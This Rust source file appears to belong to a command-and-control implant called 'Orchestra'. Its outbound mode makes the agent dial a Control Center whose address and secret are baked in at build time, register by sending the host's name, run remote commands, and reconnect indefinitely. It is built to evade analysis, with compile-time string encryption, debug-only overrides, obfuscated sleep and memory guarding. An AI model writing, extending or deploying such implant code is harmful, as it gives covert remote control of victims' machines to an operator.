//! Outbound connection mode — compiled only when `outbound-c` feature is active.
//!
//! The agent dials the Orchestra Control Center (instead of waiting for an
//! inbound connection from a console) and maintains a persistent session with
//! exponential-backoff reconnection.
//!
//! # Address resolution (first match wins)
//!
//! 1. `ORCHESTRA_C` runtime environment variable (`host:port`).
//! 2. `ORCHESTRA_C_ADDR` baked into the binary at compile time via the
//!    Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation.
//!
//! # Secret resolution (first match wins)
//!
//! 1. `ORCHESTRA_SECRET` runtime environment variable.
//! 2. `ORCHESTRA_C_SECRET` baked in at compile time.

use anyhow::{anyhow, Result};
use common::{Message, Transport};
use log::{error, info, warn};
use sysinfo::System;
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use crate::obfuscated_sleep::{calculate_jittered_sleep, execute_sleep};
use uuid::Uuid;

// Compile-time constants injected by the Builder (may be absent in manual builds).
const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");
const BAKED_CERT_FP: Option<&str> = option_env!("ORCHESTRA_C_CERT_FP");


const MAX_BACKOFF_SECS: u64 = 64;

/// Resolve the server address: runtime env var beats compile-time constant.
pub fn resolve_addr() -> Option<String> {
    #[cfg(debug_assertions)]
    if let Ok(v) = std::env::var(string_crypt::enc_str!("ORCHESTRA_C")) { return Some(v); }
    BAKED_ADDR.map(str::to_string)
}

/// Resolve the pre-shared secret: runtime env var beats compile-time constant.
pub fn resolve_secret() -> Option<String> {
    #[cfg(debug_assertions)]
    if let Ok(v) = std::env::var(string_crypt::enc_str!("ORCHESTRA_SECRET")) { return Some(v); }
    BAKED_SECRET.map(str::to_string)
}

/// Connect once, run the agent command loop until transport error or
/// clean shutdown. Returns `Ok(())` on a clean `Shutdown` command.
async fn connect_once(addr: &str, secret: &str, agent_id: &str) -> Result<()> {
    info!("outbound-c: connecting to Control Center addr={addr} agent_id={agent_id}");

    let stream = TcpStream::connect(addr).await?;
    stream.set_nodelay(true)?;

    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
    
    let mut tls_transport = common::normalized_transport::NormalizedTransport::connect(
        stream, session, common::normalized_transport::Role::Client
    ).await?;

    let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
    tls_transport
        .send(Message::Heartbeat {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
            agent_id: agent_id.to_string(),
            status: hostname,
        })
        .await?;

    info!("outbound-c: registered with Control Center, running command loop");

    let boxed: Box<dyn common::Transport + Send> = Box::new(tls_transport);
    let mut agent = crate::Agent::new(boxed)?;
    agent.run().await
}

/// Reconnect loop with exponential back-off. Returns only on clean shutdown
/// (i.e. when the agent receives `Command::Shutdown` from the server).
pub async fn run_forever() -> Result<()> {
    let addr = resolve_addr().ok_or_else(|| {
        anyhow!(
            "No Control Center address configured. \
             Set the ORCHESTRA_C environment variable (host:port) \
             or rebuild with ORCHESTRA_C_ADDR set (the Builder does this automatically)."
        )
    })?;

    let secret = resolve_secret().ok_or_else(|| {
        anyhow!(
            "No pre-shared secret configured. \
             Set the ORCHESTRA_SECRET environment variable \
             or rebuild with ORCHESTRA_C_SECRET set."
        )
    })?;

    // Generate a stable agent ID for this process lifetime so the server
    // recognises reconnects as the same agent.
    let agent_id = format!(
        "{}-{}",
        System::host_name().unwrap_or_else(|| "agent".to_string()),
        Uuid::new_v4()
    );

    let mut backoff = Duration::from_secs(1);
    loop {
        match connect_once(&addr, &secret, &agent_id).await {
            Ok(()) => {
                // Clean shutdown — respect it, do not reconnect.
                info!("outbound-c: received Shutdown from Control Center, exiting.");
                return Ok(());
            }
            Err(e) => {
                error!("outbound-c: session ended: {e:#}");
                warn!("outbound-c: reconnecting in {backoff:?}");
                // Protect sensitive memory while waiting to reconnect.
                if let Err(ge) = crate::memory_guard::guarded_sleep(backoff, None).await {
                    error!("[memory-guard] error during reconnect backoff: {ge}");
                    sleep(backoff).await;
                }
                backoff = (backoff * 2).min(Duration::from_secs(MAX_BACKOFF_SECS));
            }
        }
    }
}
